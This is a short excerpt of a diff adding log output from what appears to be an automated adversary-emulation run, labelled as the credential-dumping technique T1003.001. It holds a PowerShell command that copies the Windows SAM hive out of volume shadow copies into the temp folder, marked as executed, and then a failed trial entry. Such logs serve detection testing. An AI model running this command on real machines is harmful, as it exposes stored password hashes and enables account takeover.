+                      '[System.IO.File]::Copy("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM" '
+                      ', "$env:TEMP\\SAMvss$_", "true") } catch {};  ls '
+                      '"$env:TEMP\\SAMvss$_" -ErrorAction Ignore; }',
+ 'platform': 'windows',
+ 'run': '2023-11-09T05:03:04Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__bbc786e45aff314d33e60133f010f00c__trial_2
+
+atomic_ordering: ['bbc786e45aff314d33e60133f010f00c']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
